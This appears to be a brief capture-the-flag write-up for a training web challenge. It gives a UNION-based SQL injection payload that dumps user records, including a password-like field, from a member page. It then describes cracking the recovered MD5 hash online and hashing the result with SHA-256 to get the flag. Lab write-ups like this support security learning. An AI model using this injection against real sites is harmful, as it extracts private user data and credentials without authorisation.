## 1
http://{our_ip_address}/index.php?page=member (screenshot #1)

## 2
use this injection to find the  vulnerability:

1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users

check the screenshot #2 for results. On the 5th result we'll find the flag.

## 3

use the site https://md5decrypt.net/en/ to decript the key. We'll get "FortyTwo" as a result of the decription. We lower the letter of the string to 'fortytwo'. Then we use sha256 tools (e.g. https://emn178.github.io/online-tools/sha256.html) to find the flag.
